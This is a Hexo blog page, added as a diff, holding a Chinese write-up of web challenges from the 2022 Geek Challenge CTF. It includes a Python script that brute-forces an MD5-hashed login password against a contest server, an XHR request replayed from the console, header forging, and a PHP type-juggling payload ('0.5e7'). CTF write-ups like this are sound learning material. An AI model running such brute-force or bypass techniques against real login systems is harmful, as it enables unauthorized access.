@@ -1,0 +1,1099 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/snow.png">
+  <link rel="icon" href="/img/snow.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Aru3h@rk">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="时间来不及，最后一天打的，只写了一些web Web登录试试  12345678910111213141516171819202122232425262728#coding&#x3D;utf-8&#x2F;gbkimport requestsfrom hashlib import md5import timeburp0_url &#x3D; &quot;http:&#x2F;&#x2F;121.5.62.30:38001&#x2F;EasyTime&#x2F;Sycl">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2022_极客大挑战">
+<meta property="og:url" content="https://emoment.top/2023/01/10/2022-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/index.html">
+<meta property="og:site_name" content="Aru3h@rk&#39;s Blog">
+<meta property="og:description" content="时间来不及，最后一天打的，只写了一些web Web登录试试  12345678910111213141516171819202122232425262728#coding&#x3D;utf-8&#x2F;gbkimport requestsfrom hashlib import md5import timeburp0_url &#x3D; &quot;http:&#x2F;&#x2F;121.5.62.30:38001&#x2F;EasyTime&#x2F;Sycl">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004014.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004015.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004016.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004017.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004018.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004019.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004020.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004021.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004022.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004023.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004024.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004025.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004026.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004027.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004028.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004029.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004030.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004031.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004032.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004033.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004034.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004035.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004036.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004037.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004038.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004039.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004040.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004041.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004042.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004043.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004044.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004045.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004046.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004047.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004048.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004049.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004050.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004051.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004052.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004053.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004054.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004055.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004056.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004057.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004058.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004059.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004060.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004061.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004062.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004063.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004064.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004065.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004066.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004068.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004069.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004070.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004071.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004072.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004073.png">
+<meta property="article:published_time" content="2023-01-10T05:55:54.000Z">
+<meta property="article:modified_time" content="2023-01-10T12:08:19.608Z">
+<meta property="article:author" content="Aru3h@rk">
+<meta property="article:tag" content="web">
+<meta property="article:tag" content="2022">
+<meta property="article:tag" content="极客大挑战">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004014.png">
+  
+  
+  
+  <title>2022_极客大挑战 - Aru3h@rk&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/css/diy/mouse.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"emoment.top","root":"/","version":"1.9.3","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"PERL"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"cdfeKiXXYt5oy5kPKok1NpMX-MdYXbMMI","app_key":"nZb1Gg3blWe7z5TnY61MHQFC","server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Aru3h@rk</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                友链
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/B1.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="2022_极客大挑战"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-01-10 13:55" pubdate>
+          2023年1月10日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          32k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          134 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">2022_极客大挑战</h1>
+            
+              <p class="note note-info">
+                
+                  
+                    本文最后更新于：2023年1月10日 晚上
+                  
+                
+              </p>
+            
+            
+              <div class="markdown-body">
+                
+                <p>时间来不及，最后一天打的，只写了一些web</p>
+<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="登录试试"><a href="#登录试试" class="headerlink" title="登录试试"></a>登录试试</h2><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004014.png" srcset="/img/loading.gif" lazyload alt="image-20221120101858001"></p>
+<p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004015.png" srcset="/img/loading.gif" lazyload alt="image-20221119235315845"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#coding=utf-8/gbk</span><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> md5<br><span class="hljs-keyword">import</span> time<br><br>burp0_url = <span class="hljs-string">&quot;http://121.5.62.30:38001/EasyTime/Syclover&quot;</span><br>burp0_cookies = &#123;<span class="hljs-string">&quot;JSESSIONID&quot;</span>: <span class="hljs-string">&quot;627E869E84314D5F9920798403870F8C&quot;</span>&#125;<br>burp0_headers = &#123;<span class="hljs-string">&quot;User-Agent&quot;</span>: <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0&quot;</span>, <span class="hljs-string">&quot;Accept&quot;</span>: <span class="hljs-string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8&quot;</span>, <span class="hljs-string">&quot;Accept-Language&quot;</span>: <span class="hljs-string">&quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;</span>, <span class="hljs-string">&quot;Accept-Encoding&quot;</span>: <span class="hljs-string">&quot;gzip, deflate&quot;</span>, <span class="hljs-string">&quot;Content-Type&quot;</span>: <span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span>, <span class="hljs-string">&quot;Origin&quot;</span>: <span class="hljs-string">&quot;http://121.5.62.30:38001&quot;</span>, <span class="hljs-string">&quot;Connection&quot;</span>: <span class="hljs-string">&quot;close&quot;</span>, <span class="hljs-string">&quot;Referer&quot;</span>: <span class="hljs-string">&quot;http://121.5.62.30:38001/EasyTime/&quot;</span>, <span class="hljs-string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="hljs-string">&quot;1&quot;</span>&#125;<br><br><br>bef=<span class="hljs-string">&quot;774&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">1000</span>):<br>	<span class="hljs-keyword">if</span> i &lt; <span class="hljs-number">10</span>:<br>		s=<span class="hljs-string">&quot;00&quot;</span>+<span class="hljs-built_in">str</span>(i)<br>	<span class="hljs-keyword">if</span> i&lt;<span class="hljs-number">100</span>:<br>		s=<span class="hljs-string">&quot;0&quot;</span>+<span class="hljs-built_in">str</span>(i)<br>	<span class="hljs-keyword">else</span>:<br>		s=<span class="hljs-built_in">str</span>(i)<br>	pwd=bef+s<br>	pwdmd=md5(pwd.encode()).hexdigest()<br>	<span class="hljs-comment"># print(pwd)</span><br>	burp0_data = &#123;<span class="hljs-string">&quot;username&quot;</span>: <span class="hljs-string">&quot;Syclover&quot;</span>, <span class="hljs-string">&quot;password&quot;</span>: pwdmd&#125;<br>	result=requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)<br>	<span class="hljs-keyword">if</span> <span class="hljs-string">&quot;错误&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> result.text:<br>		<span class="hljs-built_in">print</span>(pwd)<br>		<span class="hljs-built_in">print</span>(result.text)<br>		<span class="hljs-keyword">break</span><br><br></code></pre></td></tr></table></figure>
+
+<p>flag:</p>
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-number">774931</span><br>登录成功,flag是SYC&#123;xi_huan_4_l&#125;<br><span class="hljs-string"></span><br><span class="hljs-string">[Finished in 50.8s]</span><br></code></pre></td></tr></table></figure>
+
+<h2 id="来发个包"><a href="#来发个包" class="headerlink" title="来发个包"></a>来发个包</h2><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004016.png" srcset="/img/loading.gif" lazyload alt="image-20221120101842997"></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> uname = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;ifflag&#x27;</span>).<span class="hljs-property">value</span>;<br>    <span class="hljs-keyword">var</span> xhr = <span class="hljs-keyword">new</span> <span class="hljs-title class_">XMLHttpRequest</span>();<br><span class="hljs-keyword">var</span> param = <span class="hljs-string">&#x27;ifffflag=&#x27;</span>+uname;<br>xhr.<span class="hljs-title function_">open</span>(<span class="hljs-string">&#x27;post&#x27;</span>,<span class="hljs-string">&#x27;flag.php&#x27;</span>,<span class="hljs-literal">true</span>);<br>xhr.<span class="hljs-title function_">setRequestHeader</span>(<span class="hljs-string">&quot;Content-Type&quot;</span>,<span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span>);<br>xhr.<span class="hljs-title function_">send</span>(param);<br>xhr.<span class="hljs-property">onreadystatechange</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-keyword">if</span>(xhr.<span class="hljs-property">readyState</span> == <span class="hljs-number">4</span>)&#123;<br>        <span class="hljs-keyword">if</span>(xhr.<span class="hljs-property">status</span> == <span class="hljs-number">200</span>)&#123;<br>            <span class="hljs-title function_">alert</span>(xhr.<span class="hljs-property">responseText</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>源码给出了js的XMLHttpReques对象发包源码，复制下来在控制台执行</p>
+<figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs actionscript"><span class="hljs-keyword">var</span> uname = <span class="hljs-string">&quot;flag&quot;</span>;<br>    <span class="hljs-keyword">var</span> xhr = <span class="hljs-keyword">new</span> XMLHttpRequest();<br><span class="hljs-keyword">var</span> param = <span class="hljs-string">&#x27;ifffflag=&#x27;</span>+uname;<br>xhr.open(<span class="hljs-string">&#x27;post&#x27;</span>,<span class="hljs-string">&#x27;flag.php&#x27;</span>,<span class="hljs-literal">true</span>);<br>xhr.setRequestHeader(<span class="hljs-string">&quot;Content-Type&quot;</span>,<span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span>);<br>xhr.send(param);<br>xhr.onreadystatechange = <span class="hljs-keyword">function</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-keyword">if</span>(xhr.readyState == <span class="hljs-number">4</span>)&#123;<br>        <span class="hljs-keyword">if</span>(xhr.status == <span class="hljs-number">200</span>)&#123;<br>            alert(xhr.responseText);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004017.png" srcset="/img/loading.gif" lazyload alt="image-20221120102013993"></p>
+<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey"><span class="hljs-title">SYC&#123;:</span>D_y0u_has_known_how_to_construct_<span class="hljs-built_in">a_requests</span>_by_yourself&#125;<br></code></pre></td></tr></table></figure>
+
+<h2 id="Can-Can-Need"><a href="#Can-Can-Need" class="headerlink" title="Can Can Need"></a>Can Can Need</h2><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004018.png" srcset="/img/loading.gif" lazyload alt="image-20221120102623830"></p>
+<p>基础的HTTP请求头伪造，就是From冷门点（反正我记不清有这个</p>
+<p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004019.png" srcset="/img/loading.gif" lazyload alt="image-20221120105555689"></p>
+<h2 id="L0veSyc"><a href="#L0veSyc" class="headerlink" title="L0veSyc"></a>L0veSyc</h2><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004020.png" srcset="/img/loading.gif" lazyload alt="image-20221120110025154"></p>
+<p>访问三叶草安全主页，源码搜索SYC</p>
+<p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004021.png" srcset="/img/loading.gif" lazyload alt="image-20221120110248984"></p>
+<h2 id="justphp"><a href="#justphp" class="headerlink" title="justphp"></a>justphp</h2><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004022.png" srcset="/img/loading.gif" lazyload alt="image-20221120110424225"></p>
+<p>源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">include_once</span><span class="hljs-title function_ invoke__"> </span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$sleeptime</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;SleepTime&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$sleeptime</span>))<br>&#123;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$sleeptime</span>))<br>    &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;时间是一个数字啊喂！&#x27;</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span><span class="hljs-title function_ invoke__"> if</span>(<span class="hljs-variable">$sleeptime </span>&lt; <span class="hljs-number">86400</span> * <span class="hljs-number">30</span>)<br>    &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;这点时间哪够Canzik学长睡啊&#x27;</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span><span class="hljs-title function_ invoke__"> if</span>(<span class="hljs-variable">$sleeptime </span>&gt; <span class="hljs-number">86400</span> * <span class="hljs-number">60</span>)<br>    &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;别让Canzik学长睡死在这啊！&#x27;</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;br/&gt;Canzik学长很满足,表示这次把这辈子的觉都睡完啦！flag在这,自己拿吧:&lt;br/&gt;&#x27;</span>;<br>        <span class="hljs-title function_ invoke__">sleep</span>((<span class="hljs-keyword">int</span>)<span class="hljs-variable">$sleeptime</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure>
+
+<p>弱类型绕过，需要先试出86400*30到86400*60之间的科学计数法表示的数字，这里sleep有一个int的类型转换，e在int的类型转换里不会被识别为科学计数法，可理解为只是作为一个普通的字母截断。</p>
+<p>payload:</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">0</span>.<span class="hljs-number">5</span>e7<br></code></pre></td></tr></table></figure>
+
+<p>经过int转换为0.5</p>
+<p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004023.png" srcset="/img/loading.gif" lazyload alt="image-20221120112119189"></p>
+<h2 id="jsfind"><a href="#jsfind" class="headerlink" title="jsfind"></a>jsfind</h2><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004024.png" srcset="/img/loading.gif" lazyload alt="image-20221120112401318"></p>
+<p>jsfinder工具（github有）找到</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/js/</span>aaa<span class="hljs-regexp">/aaa/</span>aaa<span class="hljs-regexp">/bbb/</span>bbb<span class="hljs-regexp">/bbb/</span>bbb<span class="hljs-regexp">/bbb/</span>bbb<span class="hljs-regexp">/aaa/</span>aaa<span class="hljs-regexp">/aaa/</span>aaa<span class="hljs-regexp">/aaa/</span>bbb/flag.js<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004025.png" srcset="/img/loading.gif" lazyload alt="image-20221120120248315"></p>
